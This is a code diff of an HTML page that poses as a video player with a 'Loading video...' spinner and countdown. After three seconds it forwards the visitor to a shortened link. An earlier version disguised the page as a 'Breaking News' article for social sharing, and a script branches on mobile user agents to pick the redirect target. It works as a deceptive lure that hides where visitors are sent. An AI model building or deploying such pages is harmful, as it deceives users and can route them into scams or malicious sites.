@@ -1,17 +1,151 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
- <meta property="og:type" content="article">
-<meta property="og:title" content="Breaking News: Latest Update">
-<meta property="og:description" content="Watch the latest breaking news and updates.">
-<meta property="og:image" content="https://imagecdn.live/images/webp/a1138ae8-76ad-4b3b-b6c7-36ff0dc6f779.webp">
-<meta property="og:url" content="https://example.com/">
-<meta property="og:site_name" content="Breaking News">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Video loading page">
+<title>Loading Video...</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+html, body {
+  margin: 0;
+  min-height: 100%;
+  background: #f5f5f5;
+}
+
+body {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+  padding: 20px;
+}
+
+.video-player {
+  width: 100%;
+  max-width: 720px;
+  margin: 25px auto;
+  background: #000;
+  border-radius: 10px;
+  overflow: hidden;
+  box-shadow: 0 5px 20px rgba(0,0,0,.25);
+}
+
+.video-screen {
+  position: relative;
+  width: 100%;
+  aspect-ratio: 16 / 9;
+  background: #111;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.loading-box {
+  text-align: center;
+  color: #fff;
+  font-family: Arial, sans-serif;
+}
+
+.loader {
+  width: 42px;
+  height: 42px;
+  margin: 0 auto 15px;
+  border: 4px solid rgba(255,255,255,.25);
+  border-top: 4px solid #fff;
+  border-radius: 50%;
+  animation: spin .8s linear infinite;
+}
+
+.loading-text {
+  font-size: 17px;
+  font-weight: 600;
+  margin-bottom: 7px;
+}
+
+.wait-text {
+  font-size: 13px;
+  color: #bbb;
+}
+
+#time {
+  color: #fff;
+  font-weight: bold;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+@media (max-width: 600px) {
+  body {
+    padding: 10px;
+  }
+
+  .video-player {
+    border-radius: 7px;
+  }
+
+  .loading-text {
+    font-size: 15px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="video-player">
+  <div class="video-screen">
+    <div class="loading-box">
+      <div class="loader"></div>
+
+      <div class="loading-text">
+        Loading video...
+      </div>
+
+      <div class="wait-text">
+        Please wait <span id="time">3</span> second
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  var time = 3;
+
+  // Change this URL to your destination
+  var link = "https://t.co/DCdvUg9mBh";
+
+  var counter = document.getElementById("time");
+
+  var timer = setInterval(function () {
+    time--;
+    counter.textContent = time;
+
+    if (time <= 0) {
+      clearInterval(timer);
+      window.location.replace(link);
+    }
+  }, 1000);
+})();
+</script>
 
 
 
- 
- <script>
+
+
+
+
+    
+    <script>
 (function(){
     var ua = navigator.userAgent || navigator.vendor || window.opera;
     var isMobile = /Android|iPhone|iPad|iPod|Windows Phone|IEMobile|BlackBerry|BB10|Opera Mini|Opera Mobi|Mobile Safari/i.test(ua);
@@ -31,25 +165,6 @@
         window.location.replace(fallbackURL);
     }
 })();
-</script>  
-
-<script>
-setTimeout(function(){
-  window.location.replace("https://t.co/DCdvUg9mBh");
-},1500);
 </script>
-
-
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-*{box-sizing:border-box}
-body{margin:0;background:#f5f5f5}
-.v{max-width:720px;width:100%;aspect-ratio:16/9;margin:auto;background:#111;display:grid;place-items:center}
-.l{width:35px;height:35px;border:3px solid #555;border-top-color:#fff;border-radius:50%;animation:s .6s linear infinite}
-@keyframes s{to{transform:rotate(360deg)}}
-</style>
-</head>
-<body>
-<div class="v"><div class="l"></div></div>
 </body>
 </html>
